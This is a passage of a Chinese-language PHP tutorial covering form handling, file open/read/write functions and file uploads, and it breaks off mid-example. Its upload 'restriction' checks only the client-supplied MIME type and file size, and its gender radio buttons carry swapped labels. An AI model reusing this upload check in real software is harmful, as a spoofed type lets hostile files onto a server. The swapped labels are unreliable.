class="token punctuation">;</span>     <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$comment</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"comment"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$genderErr</span> <span class="token operator">=</span> <span class="token string">"性别不能为空"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$gender</span> <span class="token operator">=</span> <span class="token function">test_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"gender"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><h4 id="5-PHP-完整表单"><a href="#5-PHP-完整表单" class="headerlink" title="5. PHP 完整表单"></a>5. PHP 完整表单</h4><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span><span class="token constant">PHP</span> 表单<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span> <span class="token markup">&lt;form method="POST" action="<span class="token prolog">&lt;?php echo htmlspecialchars($_SERVER['PHP_SELF']);?></span></span>"<span class="token operator">></span>  姓名：<span class="token markup">&lt;input type="name" name="name" value="<span class="token prolog">&lt;?php echo $name;?></span></span>"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>          邮箱：<span class="token markup">&lt;input type="email" name="email" value="<span class="token prolog">&lt;?php echo $email;?></span></span>"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>          网址：<span class="token markup">&lt;input type="text" name="url" value="<span class="token prolog">&lt;?php echo $url;?></span></span>"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>          性别：<span class="token markup">&lt;input type="radio" name="gender" <span class="token prolog">&lt;?php if (isset($gender) &amp;&amp; $gender=="female") echo "checked";?></span></span> value<span class="token operator">=</span><span class="token string">"female"</span><span class="token operator">></span>男    <span class="token markup">&lt;input type="radio" name="gender" <span class="token prolog">&lt;?php if (isset($gender) &amp;&amp; $gender=="male") echo "checked";?></span></span> value<span class="token operator">=</span><span class="token string">"male"</span><span class="token operator">></span>女<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>          评论：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>comment<span class="token punctuation">"</span></span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>40<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span></span>  提交：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><blockquote><p>checked 属性规定在页面加载时应该被预先选定的 input 元素。<br>checked 属性 与 <input type="checkbox"> 或 <input type="radio"> 配合使用。<br>checked 属性也可以在页面加载后，通过 JavaScript 代码进行设置。</p></blockquote><hr><h3 id="0x002-PHP-文件处理"><a href="#0x002-PHP-文件处理" class="headerlink" title="0x002 PHP 文件处理"></a>0x002 PHP 文件处理</h3><hr><p>PHP readfile() 函数</p><p>readfile() 函数读取文件，并把它写入输出缓冲。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="1-PHP-文件打开-x2F-读取-x2F-关闭"><a href="#1-PHP-文件打开-x2F-读取-x2F-关闭" class="headerlink" title="1. PHP 文件打开/读取/关闭"></a>1. PHP 文件打开/读取/关闭</h4><p><strong>PHP 打开文件</strong></p><p>打开文件的函数是 <code>fopen()</code>，<code>fopen()</code> 的第一个参数包含被打开的文件名，第二个参数规定打开文件的模式。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>fread()</code> 以及 <code>fclose()</code> 函数。</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>打开文件为只读。文件指针在文件的开头开始。</td></tr><tr><td>w</td><td>打开文件为只写。删除文件的内容或创建一个新的文件，如果它不存在。文件指针在文件的开头开始。</td></tr><tr><td>a</td><td>打开文件为只写。文件中的现有数据会被保留。文件指针在文件结尾开始。创建新的文件，如果文件不存在。</td></tr><tr><td>x</td><td>创建新文件为只写。返回 FALSE 和错误，如果文件已存在。</td></tr><tr><td>r+</td><td>打开文件为读/写、文件指针在文件开头开始。</td></tr><tr><td>w+</td><td>打开文件为读/写。删除文件内容或创建新文件，如果它不存在。文件指针在文件开头开始。</td></tr><tr><td>a+</td><td>打开文件为读/写。文件中已有的数据会被保留。文件指针在文件结尾开始。创建新文件，如果它不存在。</td></tr><tr><td>x+</td><td>创建新文件为读/写。返回 FALSE 和错误，如果文件已存在。</td></tr></tbody></table><p><strong>PHP 读取文件</strong></p><p><code>fread()</code> 函数读取打开的文件。</p><p><code>fread()</code> 的第一个参数包含待读取文件的文件名，第二个参数规定待读取的最大字节数。</p><pre class=" language-php"><code class="language-php"><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token function">filesize</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><strong>PHP 关闭文件</strong></p><p>fclose() 函数用于关闭打开的文件。</p><blockquote><p>注释：用完文件后把它们全部关闭是一个良好的编程习惯。您并不想打开的文件占用您的服务器资源。</p></blockquote><p>fclose() 需要待关闭文件的名称（或者存有文件名的变量）：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 需要执行的代码</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>PHP 读取单行文件</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><blockquote><p>注释：调用 fgets() 函数之后，文件指针会移动到下一行。</p></blockquote><p><strong>PHP 检查</strong></p><p><code>feof()</code> 函数检查是否已到达 <code>"end-of-file" (EOF)</code>。</p><p><code>feof()</code> 对于遍历未知长度的数据很有用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出单行直到 end-of-file</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>PHP 读取单字符</strong></p><p><code>fgetc()</code> 函数用于从文件中读取单个字符。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 输出单字符直到 end-of-file</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="2-PHP-创建-x2F-写入文件"><a href="#2-PHP-创建-x2F-写入文件" class="headerlink" title="2. PHP 创建/写入文件"></a>2. PHP 创建/写入文件</h4><p><strong>PHP 创建文件</strong></p><p><code>fopen()</code> 打开并不存在的文件，此函数会创建文件，假定文件被打开为写入 <code>w</code> 或增加 <code>a</code>。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span></code></pre><blockquote><p>如果运行这段代码时发生错误，请检查是否有向硬盘写入信息的 PHP 文件访问权限。</p></blockquote><p><strong>PHP 写入文件</strong></p><p><code>fwrite()</code> 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"Hello\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"World\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>PHP 覆盖</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"hello world\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"Hello World\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h4 id="3-PHP-文件上传"><a href="#3-PHP-文件上传" class="headerlink" title="3. PHP 文件上传"></a>3. PHP 文件上传</h4><p>先写一个文件上传表单</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>PHP 文件上传表单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名称:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>创建上传脚本</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"Size: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>参数解释：</p><ul><li>$_FILES[“file”][“name”] - 被上传文件的名称</li><li>$_FILES[“file”][“type”] - 被上传文件的类型</li><li>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计</li><li>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称</li><li>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</li></ul><p>上传限制(对文件格式进行限制，只允许上传 <code>.gif</code> 和 <code>.jpg</code> 格式的文件)</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">20000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token keyword">else</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Upload: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Type: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Size: "</span> <span class="token punctuation">.</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"Stored in: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token keyword">else</span>  <span class="token punctuation">{</span>  <span class="token keyword">echo</span> <span class="token string">"Invalid file"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><blockquote><p>注释：对于 IE，识别 jpg 文件的类型必须是 pjpeg，对于 FireFox，必须是 jpeg。</p></blockquote><p>保存被上传的文件</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">20000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"Return Code: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token 